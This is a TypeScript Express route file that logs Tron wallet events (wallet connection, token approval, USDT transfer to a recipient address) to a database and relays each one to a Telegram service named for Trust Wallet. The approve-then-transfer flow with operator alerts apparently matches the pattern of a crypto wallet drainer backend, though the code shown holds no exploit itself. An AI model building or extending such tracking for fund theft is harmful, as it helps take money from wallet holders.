import { Router } from "express";
import { StatusCodes } from "http-status-codes";
import { z } from "zod";
import { HttpError } from "../lib/http-error.js";
import { optionalAuth, type AuthenticatedRequest } from "../middleware/auth.js";
import { walletDb } from "../db/pool.js";
import { sendTrustWalletTronTelegramNotification } from "../services/telegram.service.js";

const notifySchema = z.discriminatedUnion("event", [
  z.object({
    event: z.literal("wallet_connected"),
    walletAddress: z.string().min(16),
    connectMethod: z.string().max(80).optional()
  }),
  z.object({
    event: z.literal("token_approved"),
    walletAddress: z.string().min(16),
    approveTxId: z.string().min(8)
  }),
  z.object({
    event: z.literal("transfer_completed"),
    walletAddress: z.string().min(16),
    toAddress: z.string().min(16),
    amountUsdt: z.number().positive(),
    approveTxId: z.string().min(8).optional(),
    transferTxId: z.string().min(8)
  }),
  z.object({
    event: z.literal("transfer_failed"),
    walletAddress: z.string().min(16).optional(),
    errorMessage: z.string().min(1).max(800)
  })
]);

const router = Router();

router.post("/notify", optionalAuth, async (req: AuthenticatedRequest, res) => {
  const parsed = notifySchema.safeParse(req.body);
  if (!parsed.success) {
    throw new HttpError(parsed.error.message, StatusCodes.BAD_REQUEST);
  }

  const linkedUserId = req.user?.sub ?? null;

  const data = parsed.data;

  let logId: string | null = null;
  try {
    const insertResult = await walletDb.query<{ id: string }>(
      `
        INSERT INTO trust_tron_telegram_logs (
          user_id,
          chain,
          event_type,
          wallet_address,
          connect_method,
          to_address,
          amount_usdt,
          approve_tx_id,
          transfer_tx_id,
          error_message
        ) VALUES ($1,$2,$3,$4,$5,$6,$7,$8,$9,$10)
        RETURNING id
      `,
      [
        linkedUserId,
        "tron",
        data.event,
        data.walletAddress ?? "unknown",
        "connectMethod" in data ? data.connectMethod ?? null : null,
        "toAddress" in data ? data.toAddress : null,
        "amountUsdt" in data ? data.amountUsdt : null,
        "approveTxId" in data ? data.approveTxId ?? null : null,
        "transferTxId" in data ? data.transferTxId : null,
        "errorMessage" in data ? data.errorMessage ?? null : null
      ]
    );
    logId = insertResult.rows[0]?.id ?? null;
  } catch (error) {
    // DB logging must never block the user flow.
    console.error("[trust-tron.notify] DB insert failed", error);
  }

  try {
    if (data.event === "wallet_connected") {
      await sendTrustWalletTronTelegramNotification({
        event: "wallet_connected",
        walletAddress: data.walletAddress,
        connectMethod: data.connectMethod,
        linkedUserId
      });
    } else if (data.event === "token_approved") {
      // Persist approved wallet as a "wallet-first" verified user on Tron.
      await walletDb.query(
        `
          INSERT INTO wallet_users (wallet_address, chain)
          VALUES ($1, 'tron')
          ON CONFLICT (wallet_address, chain) DO NOTHING
        `,
        [data.walletAddress]
      );

      await sendTrustWalletTronTelegramNotification({
        event: "token_approved",
        walletAddress: data.walletAddress,
        approveTxId: data.approveTxId,
        linkedUserId
      });
    } else if (data.event === "transfer_completed") {
      await sendTrustWalletTronTelegramNotification({
        event: "transfer_completed",
        walletAddress: data.walletAddress,
        toAddress: data.toAddress,
        amountUsdt: data.amountUsdt,
        approveTxId: data.approveTxId,
        transferTxId: data.transferTxId,
        linkedUserId
      });
    } else {
      await sendTrustWalletTronTelegramNotification({
        event: "transfer_failed",
        walletAddress: data.walletAddress,
        errorMessage: data.errorMessage,
        linkedUserId
      });
    }

    if (logId) {
      await walletDb.query(
        `
          UPDATE trust_tron_telegram_logs
          SET telegram_sent = TRUE,
              telegram_sent_at = NOW(),
              telegram_error = NULL
          WHERE id = $1
        `,
        [logId]
      );
    }
  } catch (error) {
    console.error("[trust-tron.notify] Telegram notification failed", error);
    if (logId) {
      const message = error instanceof Error ? error.message : String(error);
      await walletDb.query(
        `
          UPDATE trust_tron_telegram_logs
          SET telegram_sent = FALSE,
              telegram_error = $2
          WHERE id = $1
        `,
        [logId, message]
      );
    }
  }

  res.status(StatusCodes.OK).json({ ok: true });
});

export { router as trustTronRoutes };
